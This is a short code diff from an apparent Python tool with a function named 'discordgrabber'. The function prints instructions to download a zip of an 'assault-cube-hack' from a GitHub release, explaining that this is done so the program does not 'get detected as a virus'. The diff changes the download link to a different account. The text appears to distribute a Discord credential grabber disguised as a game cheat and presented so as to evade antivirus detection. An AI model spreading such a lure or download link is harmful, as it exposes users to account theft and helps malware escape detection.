@@ -33,7 +33,7 @@ def discordgrabber():
   print(bcolors.OKBLUE + """
     You need to download the file, since we don't want this program to get detected as a virus.
     Open the tutorial section in this program for a tutorial on how to use it.
-    https://github.com/itssnee/assault-cube-hack/releases/download/minor-update/download.zip
+    https://github.com/itsk0ntra/assault-cube-hack/releases/download/minor-update/download.zip
     """)
   time.sleep(10.00)
 discordgrabber()
